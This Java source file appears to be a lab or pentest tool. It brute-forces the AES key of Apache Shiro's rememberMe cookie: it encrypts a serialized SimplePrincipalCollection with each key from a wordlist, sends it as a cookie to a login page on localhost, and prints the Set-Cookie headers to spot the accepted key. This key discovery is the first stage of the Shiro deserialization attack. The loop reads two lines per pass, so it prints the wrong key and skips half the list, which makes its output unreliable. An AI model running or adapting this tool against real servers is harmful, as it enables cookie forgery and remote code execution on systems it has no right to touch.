package shiro;

import com.mchange.v2.ser.SerializableUtils;
import org.apache.http.Header;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.params.ConnRoutePNames;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.tomcat.util.codec.binary.Base64;
import sun.misc.BASE64Encoder;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Scanner;

public class FindKey {

    public static String encrypt(byte[] serialized,String key) throws Exception{
        byte[] raw = Base64.decodeBase64(key);
        Cipher cipher= Cipher.getInstance("AES/CBC/PKCS5Padding");//"算法/模式/补码方式"
        int sizeInBytes = 16;
        byte[] iv = new byte[sizeInBytes];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        //偏移量
        IvParameterSpec ivSpec =  new IvParameterSpec(iv);
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec, ivSpec);
        byte[] encrypted = cipher.doFinal(serialized);
        byte[] output;
        output = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, output, 0, iv.length);
        System.arraycopy(encrypted, 0, output, iv.length, encrypted.length);
        return (new BASE64Encoder().encode(output)).replaceAll("\r\n","");
    }

    public static byte[] toByteArray(String filename) throws IOException {

        File f = new File(filename);
        if (!f.exists()) {
            throw new FileNotFoundException(filename);
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream((int) f.length());
        BufferedInputStream in = null;
        try {
            in = new BufferedInputStream(new FileInputStream(f));
            int buf_size = 1024;
            byte[] buffer = new byte[buf_size];
            int len = 0;
            while (-1 != (len = in.read(buffer, 0, buf_size))) {
                bos.write(buffer, 0, len);
            }
            return bos.toByteArray();
        } catch (IOException e) {
            e.printStackTrace();
            throw e;
        } finally {
            try {
                in.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            bos.close();
        }
    }

    public static Object getObject() {
        return new SimplePrincipalCollection();
    }




    public static void main(String args[]){

        try {
            Object chainObject=getObject();
            byte[] bytes = SerializableUtils.toByteArray(chainObject);
            Scanner scanner = new Scanner(new File("src/main/resources/shiro_keys.txt"));
            while (scanner.hasNextLine()) {
                HttpClient httpClient = new DefaultHttpClient();
                String remember=encrypt(bytes,scanner.nextLine());
                HttpGet httpGet=new HttpGet("http://127.0.0.1:8080/login");
                httpGet.setHeader("Cookie","rememberMe="+remember);
                httpGet.setHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36");
                httpGet.addHeader("Connection","close");

                HttpHost proxy = new HttpHost("127.0.0.1", 8081, "http");
//                RequestConfig config = RequestConfig.custom().setProxy(proxy).build();
//                httpGet.setConfig(config);

                httpClient.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY,proxy);
                HttpResponse httpResponse= httpClient.execute(httpGet);
                Header[] headers=httpResponse.getHeaders("Set-Cookie");

                System.out.println(scanner.nextLine());
                for (int i=0;i<headers.length;i++){
                    System.out.println(i);
                    System.out.println(headers[i]);
                }

           //     System.out.println( httpResponse.getHeaders("Set-Cookie")[0].toString()) ;


            }
            scanner.close();
        } catch (Exception e) {
            e.printStackTrace();
        }




    }



}
